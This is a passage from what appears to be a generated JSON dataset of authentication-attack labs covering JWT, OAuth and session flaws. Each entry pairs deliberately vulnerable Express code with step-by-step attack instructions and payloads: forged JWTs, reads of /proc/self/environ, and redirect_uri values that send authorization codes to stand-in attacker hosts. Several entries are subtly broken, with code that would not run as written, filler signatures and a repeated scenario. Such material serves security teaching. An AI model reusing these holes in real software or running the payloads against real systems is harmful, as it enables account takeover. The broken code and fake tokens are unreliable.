        "Solution Steps": [
            "Intercept a valid API request with Burp Suite to capture the JWT",
            "Decode the token and identify the vulnerable kid header parameter",
            "Modify the kid header to point to /dev/null or /proc/self/environ",
            "Sign the modified token with a blank key or environment variables",
            "Submit the forged token to access admin endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst keys = {\n  'default': fs.readFileSync('./keys/default.key')\n};\n\napp.post('/verify', (req, res) => {\n  const { token } = req.body;\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    const kid = decoded.header.kid;\n    const key = kid ? fs.readFileSync(kid) : keys['default'];\n    const verified = jwt.verify(token, key);\n    res.json({ valid: true, user: verified.user });\n  } catch (err) {\n    res.status(403).json({ valid: false });\n  }\n});\n\nconst PORT = 3001;\napp.listen(PORT, () => console.log(`JWT Verifier running on port ${PORT}`));",
        "payloads": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.1dX6kP4W7tQ4x7Z3J2J2J2J2J2J2J2J2J2J2J2J2J2J2",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9wcm9jL3NlbGYvZW52aXJvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.3J2J2J2J2J2J2J2J2J2J2J2J2J2J2J2J2J2J2J2"
        ]
    },
    {
        "Lab scenario": "OAuth token swapping via insecure state parameter",
        "Lab Description": "The OAuth implementation fails to properly validate the state parameter between requests. The application associates tokens with the wrong session if state changes mid-flow. To solve: intercept the OAuth flow and swap the state parameter to hijack another user's token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Initiate OAuth login and intercept the /authorize request with OWASP ZAP",
            "Note the original state parameter and let the request proceed",
            "Intercept the callback request before the state validation occurs",
            "Modify the state parameter to match an active victim session",
            "Complete the flow to receive the victim's access token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\nconst authSessions = {};\nconst accessTokens = {};\n\napp.get('/authorize', (req, res) => {\n  const { client_id, state } = req.query;\n  const sessionId = crypto.randomBytes(16).toString('hex');\n  authSessions[sessionId] = { client_id, state };\n  res.redirect(`/login?session=${sessionId}`);\n});\n\napp.get('/callback', (req, res) => {\n  const { code, state } = req.query;\n  const session = Object.values(authSessions).find(s => s.state === state);\n  if (!session) return res.status(400).send('Invalid state');\n  \n  const token = crypto.randomBytes(24).toString('hex');\n  accessTokens[token] = { client_id: session.client_id };\n  res.redirect(`${session.redirect_uri}?token=${token}`);\n});\n\nconst PORT = 3002;\napp.listen(PORT, () => console.log(`OAuth Provider running on port ${PORT}`));",
        "payloads": [
            "state=attacker_state&client_id=lab_client",
            "state=victim_state&code=intercepted_code"
        ]
    },
    {
        "Lab scenario": "Session prediction via insecure cookie generation",
        "Lab Description": "The application uses predictable session cookie generation based on timestamps. The cookie can be brute-forced by enumerating possible time values. To solve: predict an active admin session cookie by analyzing the cookie generation pattern.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Capture multiple session cookies with Burp Suite over time",
            "Analyze cookie structure using CyberChef to identify timestamp pattern",
            "Generate possible cookies for current time window using Python script",
            "Use Burp Intruder to brute-force cookies in the predicted range",
            "Identify valid cookie through response length differences"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nconst sessions = {};\n\napp.get('/login', (req, res) => {\n  const { username, password } = req.query;\n  if (username === 'admin' && password === 's3cr3tP@ss') {\n    const sessionId = generateSessionId();\n    sessions[sessionId] = { username: 'admin', lastAccess: Date.now() };\n    res.cookie('session', sessionId);\n    return res.send('Admin logged in');\n  }\n  res.status(403).send('Invalid credentials');\n});\n\napp.get('/admin', (req, res) => {\n  const sessionId = req.cookies.session;\n  if (sessions[sessionId]?.username === 'admin') {\n    return res.send('Sensitive admin data');\n  }\n  res.status(403).send('Access denied');\n});\n\nfunction generateSessionId() {\n  const timePart = Math.floor(Date.now() / 1000).toString(16);\n  const randPart = Math.floor(Math.random() * 1000).toString(16);\n  return `${timePart}-${randPart}`;\n}\n\nconst PORT = 3003;\napp.listen(PORT, () => console.log(`Session Lab running on port ${PORT}`));",
        "payloads": [
            "647a3b1a-3e8",
            "647a3b1b-1a5",
            "647a3b1c-7f2"
        ]
    },
    {
        "Lab scenario": "JWT public key substitution via jku header injection",
        "Lab Description": "The JWT validation endpoint trusts arbitrary jku (JSON Key URL) headers. The application fails to verify the source of public keys. To solve: forge a valid admin token by hosting a malicious JWKS endpoint and injecting your public key.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept a valid JWT with Burp Suite and note the jku header",
            "Generate a RSA key pair using OpenSSL",
            "Host a malicious JWKS endpoint with your public key",
            "Craft a new JWT with modified claims and jku pointing to your endpoint",
            "Submit the forged token to bypass authentication"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\n\nconst client = jwksClient({\n  jwksUri: 'https://trusted-keys.example.com/.well-known/jwks.json'\n});\n\napp.post('/verify', (req, res) => {\n  const { token } = req.body;\n  const decoded = jwt.decode(token, { complete: true });\n  \n  if (decoded.header.jku) {\n    client = jwksClient({ jwksUri: decoded.header.jku });\n  }\n  \n  client.getSigningKey(decoded.header.kid, (err, key) => {\n    if (err) return res.status(403).send('Invalid key');\n    jwt.verify(token, key.getPublicKey(), (err, decoded) => {\n      if (err) return res.status(403).send('Invalid token');\n      res.json({ valid: true, user: decoded.user });\n    });\n  });\n});\n\nconst PORT = 3001;\napp.listen(PORT, () => console.log(`JWT Validator running on port ${PORT}`));",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItc2l0ZS5jb20va2V5cy5qc29uIiwia2lkIjoiYXR0YWNrZXJLZXkifQ.eyJ1c2VyIjoiYWRtaW4ifQ.fake-signature",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6OTk5OS9tYWxpY2lvdXMuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.fake-sig"
        ]
    },
    {
        "Lab scenario": "OAuth token hijack via insecure PKCE implementation",
        "Lab Description": "The OAuth provider fails to properly validate Proof Key for Code Exchange (PKCE) parameters. The application accepts authorization codes without matching code verifiers. To solve: steal an authorization code and exchange it for a token without knowing the original code_verifier.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept OAuth flow with OWASP ZAP to capture authorization request",
            "Note the code_challenge parameter but disregard it",
            "Intercept the redirect containing the authorization code",
            "Exchange the stolen code at the token endpoint without code_verifier",
            "Use the access token to impersonate the victim"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\nconst authCodes = {};\nconst accessTokens = {};\n\napp.get('/authorize', (req, res) => {\n  const { client_id, code_challenge } = req.query;\n  const code = crypto.randomBytes(16).toString('hex');\n  authCodes[code] = { client_id };\n  res.redirect(`/callback?code=${code}`);\n});\n\napp.post('/token', (req, res) => {\n  const { client_id, code } = req.body;\n  if (!authCodes[code]) return res.status(400).json({ error: 'Invalid code' });\n  \n  const token = crypto.randomBytes(24).toString('hex');\n  accessTokens[token] = { client_id };\n  delete authCodes[code];\n  \n  res.json({ access_token: token });\n});\n\nconst PORT = 3002;\napp.listen(PORT, () => console.log(`OAuth Server running on port ${PORT}`));",
        "payloads": [
            "client_id=webapp&code_challenge=unverifiedChallenge",
            "client_id=webapp&code=stolenCode"
        ]
    },
    {
        "Lab scenario": "Session fixation via subdomain cookie scope",
        "Lab Description": "The application sets session cookies with overly broad domain scope (.example.com). The cookie can be fixed across subdomains. To solve: obtain a session cookie from a vulnerable subdomain and reuse it on the target application.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Discover vulnerable subdomain (legacy.example.com) using Sublist3r",
            "Interact with vulnerable endpoint to receive a session cookie",
            "Note the cookie's domain attribute is set to .example.com",
            "Navigate to secure.example.com with the same cookie",
            "Access authenticated resources on the secure subdomain"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const { username, password } = req.query;\n  if (username === 'admin' && password === 'admin123') {\n    res.cookie('session', 'fixedSession123', { domain: '.example.com' });\n    return res.send('Logged in');\n  }\n  res.status(403).send('Invalid credentials');\n});\n\napp.get('/admin', (req, res) => {\n  if (req.cookies.session === 'fixedSession123') {\n    return res.send('Admin dashboard');\n  }\n  res.status(403).send('Access denied');\n});\n\nconst PORT = 3003;\napp.listen(PORT, () => console.log(`Session App running on port ${PORT}`));",
        "payloads": [
            "session=fixedSession123",
            "session=anotherFixedSession"
        ]
    },
    {
        "Lab scenario": "JWT x5u header SSRF in microservice authentication",
        "Lab Description": "The JWT validation service blindly trusts x5u header certificates from external URLs. The application fails to sanitize certificate fetch requests. To solve: forge an admin token by hosting a malicious X.509 certificate and exploiting SSRF in the certificate fetching process.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept a valid JWT with Burp Suite and note the x5u header",
            "Generate a self-signed X.509 certificate with admin privileges",
            "Host the certificate on a controlled server with SSRF exploitable endpoint",
            "Craft a JWT with x5u pointing to your malicious certificate",
            "Submit the token to trigger certificate fetch and gain admin access"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst https = require('https');\nconst app = express();\n\napp.post('/verify', (req, res) => {\n  const { token } = req.body;\n  const decoded = jwt.decode(token, { complete: true });\n  \n  if (decoded.header.x5u) {\n    https.get(decoded.header.x5u, (certRes) => {\n      let certData = '';\n      certRes.on('data', (chunk) => certData += chunk);\n      certRes.on('end', () => {\n        try {\n          const verified = jwt.verify(token, certData);\n          res.json({ valid: true, user: verified.user });\n        } catch (e) {\n          res.status(403).json({ valid: false });\n        }\n      });\n    });\n  } else {\n    res.status(400).json({ error: 'x5u header required' });\n  }\n});\n\nconst PORT = 3001;\napp.listen(PORT, () => console.log(`JWT Validator running on port ${PORT}`));",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXItc2l0ZS5jb20vbWFsY2VydC5wZW0ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.fake-sig",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9sb2NhbGhvc3Q6OTk5OS9ldmlsLmNlcnQifQ.eyJ1c2VyIjoiYWRtaW4ifQ.fake-sig"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via insecure fragment redirect",
        "Lab Description": "The OAuth implementation leaks access tokens in URL fragments during redirects. The application fails to properly handle the response_type=token flow. To solve: intercept the redirect and extract the token from the fragment before the client-side JavaScript processes it.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Initiate OAuth flow with response_type=token using Postman",
            "Intercept the redirect response with Burp Proxy before JavaScript executes",
            "Extract the access_token from the URL fragment",
            "Use the token directly in API requests",
            "Access protected resources as the victim user"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\nconst clients = {\n  'webapp': { secret: 'clientsecret123', redirect_uri: 'https://client.com/callback' }\n};\n\napp.get('/authorize', (req, res) => {\n  const { client_id, response_type } = req.query;\n  if (response_type === 'token') {\n    const token = crypto.randomBytes(24).toString('hex');\n    return res.redirect(`${clients[client_id].redirect_uri}#access_token=${token}`);\n  }\n  res.status(400).send('Invalid response_type');\n});\n\nconst PORT = 3002;\napp.listen(PORT, () => console.log(`OAuth Provider running on port ${PORT}`));",
        "payloads": [
            "response_type=token&client_id=webapp",
            "response_type=token&client_id=webapp&redirect_uri=https://attacker.com/callback"
        ]
    },
    {
        "Lab scenario": "Session hijacking via WebSocket authentication bypass",
        "Lab Description": "The application authenticates WebSocket connections using predictable session tokens. The WebSocket endpoint fails to validate token origin. To solve: predict or intercept a WebSocket session token and hijack an active session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture WebSocket handshake requests with OWASP ZAP",
            "Analyze session token generation algorithm",
            "Predict valid tokens based on timestamp patterns",
            "Connect to WebSocket endpoint with predicted token",
            "Intercept and manipulate real-time communications"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst server = app.listen(3003);\nconst wss = new WebSocket.Server({ server });\n\nwss.on('connection', (ws, req) => {\n  const token = req.url.split('token=')[1];\n  if (!token || !validateToken(token)) {\n    return ws.close(1008, 'Invalid token');\n  }\n  \n  ws.on('message', (message) => {\n    wss.clients.forEach((client) => {\n      if (client !== ws && client.readyState === WebSocket.OPEN) {\n        client.send(message);\n      }\n    });\n  });\n});\n\nfunction validateToken(token) {\n  return token.startsWith('ws-') && token.length === 32;\n}\n\nconsole.log(`WebSocket Server running on port 3003`);",
        "payloads": [
            "ws-7c6d5f4e3d2c1b0a9f8e7d6c5b4a3",
            "ws-00000000000000000000000000000000"
        ]
    },
    {
        "Lab scenario": "JWT alg:none exploitation in REST API authentication",
        "Lab Description": "The application uses JSON Web Tokens with improper signature validation. The vulnerable endpoint accepts unsigned tokens when the alg header is set to 'none'. To solve: forge an administrative JWT by removing the signature and modifying claims.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept valid JWT in Burp Suite while browsing authenticated sections",
            "Decode the JWT using jwt.io or Burp Decoder to analyze structure",
            "Modify the alg header to 'none' and remove signature section",
            "Change 'role' claim from 'user' to 'admin' and remove signature entirely",
            "Submit modified token in Authorization header to /admin endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = {\n  'user1': { password: 'pass123', role: 'user' },\n  'admin': { password: 'adminPass', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretKey', { algorithm: 'HS256' });\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, 'secretKey', { algorithms: ['HS256', 'none'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin panel accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTgwMjY1MjJ9.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via misconfigured redirect_uri in social login",
        "Lab Description": "The application's OAuth implementation fails to validate redirect_uri parameters properly, allowing authorization code interception. The vulnerable flow leaks tokens to attacker-controlled domains. To solve: steal authorization code by manipulating redirect_uri and exchange it for access token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Initiate OAuth flow and intercept /authorize request in Burp Suite",
            "Modify redirect_uri parameter to attacker-controlled domain",
            "Capture authorization code when victim gets redirected",
            "Exchange stolen code for access token at /oauth/token endpoint",
            "Use access token to authenticate as victim via API"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': {\n    secret: 'sec789',\n    allowedRedirects: ['https://trusted.com/callback']\n  }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  if (!clients[client_id]) return res.status(400).send('Invalid client');\n  \n  const code = 'authcode_' + Math.random().toString(36).substr(2,9);\n  res.redirect(`${redirect_uri}?code=${code}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (clients[client_id]?.secret === client_secret) {\n    res.json({\n      access_token: 'access_' + Math.random().toString(36).substr(2,12),\n      token_type: 'Bearer'\n    });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3001);",
        "payloads": [
            "https://attacker.com/callback?code=stolen_code",
            "http://localhost:9999/leak?code=STOLEN123",
            "https://trusted.com.collab.com/capture?code=ABC123"
        ]
    },
    {
        "Lab scenario": "Session fixation via unsafe session regeneration in GraphQL endpoint",
        "Lab Description": "The application's GraphQL API maintains sessions after password changes without proper invalidation. The vulnerable mutation allows maintaining active sessions post-authentication changes. To solve: fixate session on victim account before password change, then reuse session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Capture session cookie during account registration using OWASP ZAP",
            "Initiate password reset flow for victim account while maintaining session",
            "Verify continued session validity after password change via Postman",
            "Execute privileged GraphQL mutations using fixated session",
            "Extract sensitive data through malformed queries"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst cookieParser = require('cookie-parser');\n\nconst schema = buildSchema(`\n  type Query {\n    getUser(id: ID!): User\n  }\n  type Mutation {\n    changePassword(old: String!, new: String!): Boolean\n  }\n  type User {\n    id: ID!\n    email: String!\n    admin: Boolean!\n  }\n`);\n\nconst users = {\n  '1': { email: 'user@test.com', password: 'oldPass', admin: false }\n};\n\nconst root = {\n  getUser: ({id}) => users[id],\n  changePassword: ({old, new: newPass}, req) => {\n    if (users[req.userId].password === old) {\n      users[req.userId].password = newPass;\n      return true;\n    }\n    return false;\n  }\n};\n\nconst app = express();\napp.use(cookieParser());\n\napp.use('/graphql', (req, res) => {\n  const userId = req.cookies.session || '1';\n  req.userId = userId;\n  \n  graphqlHTTP({\n    schema: schema,\n    rootValue: root,\n    context: { req, res },\n    graphiql: true\n  })(req, res);\n});\n\napp.listen(4000);",
        "payloads": [
            "mutation { changePassword(old: \"victimPass\", new: \"hacked123\") }",
            "query { getUser(id: \"1\") { email admin } }",
            "{\"query\":\"mutation { changePassword(old: \\\"temp123\\\", new: \\\"attackerPass\\\") }\",\"variables\":null}"
        ]
    },
    {
        "Lab scenario": "JWT kid header path traversal in microservice authentication",
        "Lab Description": "The application's JWT validation improperly uses user-controlled kid header to load verification keys from filesystem. The vulnerable implementation allows directory traversal via kid parameter. To solve: forge admin token by forcing system to use attacker-controlled public key.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept valid JWT in Burp Suite and note kid header value",
            "Modify kid header to point to /dev/null or /proc/self/environ",
            "Observe server error messages revealing filesystem structure",
            "Craft malicious JWT with kid pointing to /tmp/attacker_key.pub",
            "Upload RSA public key to predictable temporary location and validate forged token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst users = {\n  'user': { role: 'user', key: 'keys/user.pub' },\n  'admin': { role: 'admin', key: 'keys/admin.pub' }\n};\n\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    const keyPath = decoded.header.kid || 'keys/default.pub';\n    const pubKey = fs.readFileSync(keyPath);\n    const payload = jwt.verify(token, pubKey);\n    res.json({ access: payload.role });\n  } catch (e) {\n    res.status(500).json({ error: e.message });\n  }\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy90bXAvYXR0YWNrZXJfa2V5LnB1YiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
            "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii9kZXYvbnVsbCIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature"
        ]
    },
    {
        "Lab scenario": "Session hijacking via WebSocket connection hijack",
        "Lab Description": "The application's WebSocket handshake fails to validate session transition from HTTP to WS protocol. The vulnerable implementation accepts existing HTTP cookies without re-authentication. To solve: hijack active session by intercepting WebSocket upgrade request.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Capture WebSocket connection sequence using OWASP ZAP",
            "Intercept WS upgrade request containing session cookie",
            "Modify Origin header to bypass same-origin checks",
            "Replay captured cookies in new WebSocket connection",
            "Execute privileged actions through hijacked WS channel"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\n\napp.use((req, res, next) => {\n  res.cookie('session', 'fixed-value', { httpOnly: true });\n  next();\n});\n\nwss.on('connection', (ws, req) => {\n  const cookies = req.headers.cookie;\n  ws.send('Connected with session: ' + cookies);\n  \n  ws.on('message', (data) => {\n    if (cookies.includes('admin=true')) {\n      ws.send('Admin command executed: ' + data);\n    } else {\n      ws.send('Unauthorized');\n    }\n  });\n});",
        "payloads": [
            "GET /ws HTTP/1.1\r\nHost: vulnerable.com\r\nCookie: session=stolen-value; admin=true\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n",
            "{\"type\":\"command\",\"data\":\"get_secrets\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token swapping via insecure state parameter",
        "Lab Description": "The application's OAuth flow fails to properly validate state parameter between requests. The vulnerable implementation allows swapping authorization codes between clients. To solve: intercept victim's auth code and associate it with attacker's session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Initiate OAuth flow and capture state parameter in Burp Suite",
            "Trick victim into initiating OAuth with known state value",
            "Intercept victim's authorization code before redirection",
            "Swap victim's code into attacker's OAuth callback request",
            "Complete OAuth flow with victim's permissions"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst authCodes = {};\nconst tokens = {};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, state } = req.query;\n  authCodes[state] = { client_id, user: 'victim' };\n  res.redirect(`/callback?code=auth_code_${Date.now()}&state=${state}`);\n});\n\napp.get('/oauth/token', (req, res) => {\n  const { code, state } = req.query;\n  if (authCodes[state]) {\n    tokens[code] = { \n      access_token: `token_${Math.random().toString(36).substr(2)}`,\n      user: authCodes[state].user\n    };\n    res.json(tokens[code]);\n  } else {\n    res.status(400).json({ error: 'Invalid state' });\n  }\n});\n\napp.listen(3000);",
        "payloads": [
            "/oauth/authorize?client_id=attacker&state=fixed-value",
            "/oauth/token?code=victim_code&state=fixed-value",
            "/callback?code=victim_code&state=fixed-value"
        ]
    },
    {
        "Lab scenario": "JWT algorithm confusion attack in REST API authentication",
        "Lab Description": "The application's JWT implementation fails to validate the algorithm specified in the token header against the server's expected algorithm. The vulnerable endpoint accepts RS256-signed tokens when configured for HS256. To solve: forge a valid JWT by converting public key to HMAC secret.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept valid JWT in Burp Suite and decode to identify RS256 algorithm",
            "Extract public key from /jwks.json or /certificate endpoints",
            "Convert RSA public key to HMAC secret using Python script",
            "Forge new token with HS256 algorithm and admin claims",
            "Submit forged token in Authorization header to /admin endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst RSA_PUBLIC_KEY = fs.readFileSync('./public.key');\nconst HMAC_SECRET = 'weak-secret-key';\n\napp.get('/admin', (req, res) => {\n    const token = req.headers.authorization?.split(' ')[1];\n    try {\n        const decoded = jwt.verify(token, RSA_PUBLIC_KEY, { algorithms: ['HS256', 'RS256'] });\n        if (decoded.role === 'admin') {\n            res.send('Admin access granted');\n        } else {\n            res.status(403).send('Forbidden');\n        }\n    } catch (e) {\n        res.status(401).send('Invalid token');\n    }\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0.fake-signature"
        ]
    },
    {
        "Lab scenario": "Session fixation via GraphQL mutation race condition",
        "Lab Description": "The application's GraphQL mutation for session generation contains a race condition when multiple requests are sent simultaneously. The vulnerable implementation allows session tokens to remain valid after password changes. To solve: fixate session token during password reset and maintain access.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Identify session mutation in GraphQL introspection using Postman",
            "Send parallel requests for password change and session refresh",
            "Capture valid session token before invalidation occurs",
            "Maintain authenticated state with captured token post-reset",
            "Execute privileged GraphQL queries with fixated session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst app = express();\n\nconst schema = buildSchema(`\n  type Mutation {\n    changePassword(old: String!, new: String!): Boolean\n    refreshSession: String\n  }\n`);\n\nlet currentSession = null;\n\nconst root = {\n  changePassword: ({old, new: newPass}) => {\n    currentSession = null;\n    return true;\n  },\n  refreshSession: () => {\n    currentSession = `session_${Math.random().toString(36).substr(2)}`;\n    return currentSession;\n  }\n};\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(4000);",
        "payloads": [
            "mutation { refreshSession }",
            "mutation { changePassword(old: \"oldPass\", new: \"newPass\") }",
            "{\"query\":\"mutation { refreshSession changePassword(old: \\\"victim\\\", new: \\\"hacked\\\") }\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via verbose error messages",
        "Lab Description": "The application's OAuth token endpoint leaks sensitive information through detailed error responses. The vulnerable implementation reveals valid tokens in error messages during race conditions. To solve: trigger token leakage through concurrent requests and harvest valid tokens.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept OAuth token request in Burp Suite",
            "Send duplicate token requests simultaneously using Turbo Intruder",
            "Analyze error responses for leaked token information",
            "Extract valid tokens from verbose error messages",
            "Use stolen tokens to authenticate as victim"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst tokens = {};\n\napp.post('/oauth/token', (req, res) => {\n    const { code } = req.body;\n    if (tokens[code]) {\n        res.status(400).json({ \n            error: `Token ${tokens[code]} already issued for code ${code}` \n        });\n    } else {\n        const token = `token_${Math.random().toString(36).substr(2)}`;\n        tokens[code] = token;\n        res.json({ access_token: token });\n    }\n});\n\napp.listen(3001);",
        "payloads": [
            "code=legit_code&client_id=attacker",
            "code=victim_code&client_id=attacker",
            "{\"code\":\"victim_code\",\"client_id\":\"attacker\"}"
        ]
    },
    {
        "Lab scenario": "JWT claim injection via unverified header parameters in REST API",
        "Lab Description": "The application's JWT validation fails to verify all header parameters while processing tokens. The vulnerable implementation allows injecting custom claims through unverified header parameters. To solve: escalate privileges by injecting admin claims through custom headers.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept valid JWT in Burp Suite and decode to analyze structure",
            "Add custom header parameter 'x5c' with forged claims",
            "Modify payload to include 'role':'admin' in custom header",
            "Verify server processes injected claims by checking response",
            "Access admin functionality with elevated privileges"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst SECRET = 'weak-secret-123';\n\napp.get('/admin', (req, res) => {\n    const token = req.headers.authorization?.split(' ')[1];\n    try {\n        const decoded = jwt.verify(token, SECRET, { ignoreHeaders: false });\n        if (decoded.header?.x5c?.role === 'admin') {\n            res.send('Admin access granted');\n        } else {\n            res.status(403).send('Forbidden');\n        }\n    } catch (e) {\n        res.status(401).send('Invalid token');\n    }\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6eyJyb2xlIjoiYWRtaW4ifX0.eyJzdWIiOiIxMjM0In0.fake-signature",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImN1c3RvbSI6eyJyb2xlIjoiYWRtaW4ifX0.eyJ1c2VyIjoiam9obiJ9.fake-signature"
        ]
    },
    {
        "Lab scenario": "Session fixation via WebSocket subprotocol negotiation",
        "Lab Description": "The application's WebSocket implementation assigns sessions during subprotocol negotiation without proper validation. The vulnerable handshake process allows session fixation through crafted subprotocol headers. To solve: fixate session ID during WS connection and hijack authenticated session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture WebSocket handshake in OWASP ZAP",
            "Modify Sec-WebSocket-Protocol header to include session token",
            "Force server to accept custom session ID during negotiation",
            "Trick victim into authenticating with fixated session",
            "Reuse WebSocket connection with victim's privileges"
        ],
        "Vulnerability name": "Authentication",
